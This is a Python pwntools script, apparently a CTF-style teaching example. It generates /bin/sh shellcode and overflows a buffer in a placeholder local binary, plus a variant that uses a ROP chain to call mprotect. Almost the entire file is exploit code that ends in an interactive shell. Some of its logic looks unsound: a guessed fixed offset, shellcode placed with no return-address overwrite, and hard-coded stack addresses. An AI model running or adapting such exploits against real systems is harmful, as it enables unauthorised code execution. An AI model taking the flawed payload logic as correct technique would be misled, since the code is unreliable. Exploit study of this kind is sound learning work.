#!/usr/bin/env python3
"""
Example: Shellcode Generation and Injection

This example demonstrates generating and injecting shellcode with pwntools.
"""

from pwn import *

# Configuration
context(arch='amd64', os='linux', log_level='info')
BINARY = './binary'

def exploit():
    # Load binary
    elf = ELF(BINARY)
    print(f"[*] Binary: {BINARY}")

    # Generate shellcode
    print("[*] Generating shellcode...")
    context(arch='amd64', os='linux')
    shellcode = asm(shellcraft.sh())
    print(f"[+] Shellcode size: {len(shellcode)} bytes")
    print(f"[+] Shellcode hex: {shellcode.hex()}")

    # Check for null bytes
    if b'\x00' in shellcode:
        print("[-] Warning: Shellcode contains null bytes")

    # Find buffer overflow offset
    print("[*] Finding buffer overflow offset...")
    offset = 100  # Adjust based on binary

    # Build payload
    print("[*] Building payload...")
    payload = b'A' * offset + shellcode
    print(f"[+] Payload size: {len(payload)}")

    # Send exploit
    print("[*] Sending exploit...")
    p = process(BINARY)
    p.sendline(payload)

    # Interact
    print("[*] Interacting with shell...")
    p.interactive()

def exploit_with_rop():
    """Alternative: Use ROP to make memory executable"""
    elf = ELF(BINARY)
    print(f"[*] Binary: {BINARY}")

    # Generate shellcode
    print("[*] Generating shellcode...")
    shellcode = asm(shellcraft.sh())
    print(f"[+] Shellcode size: {len(shellcode)} bytes")

    # Build ROP chain to make memory executable
    print("[*] Building ROP chain...")
    rop = ROP(elf)

    # Assume shellcode is at rsp
    # Call mprotect to make stack executable
    rop.call('mprotect', [0x7ffffffde000, 0x1000, 7])
    rop.raw(0x7ffffffde000)  # Jump to shellcode

    # Find buffer overflow offset
    offset = 100

    # Build payload
    print("[*] Building payload...")
    payload = b'A' * offset + rop.chain() + shellcode
    print(f"[+] Payload size: {len(payload)}")

    # Send exploit
    print("[*] Sending exploit...")
    p = process(BINARY)
    p.sendline(payload)

    # Interact
    print("[*] Interacting with shell...")
    p.interactive()

if __name__ == '__main__':
    exploit()
    # exploit_with_rop()
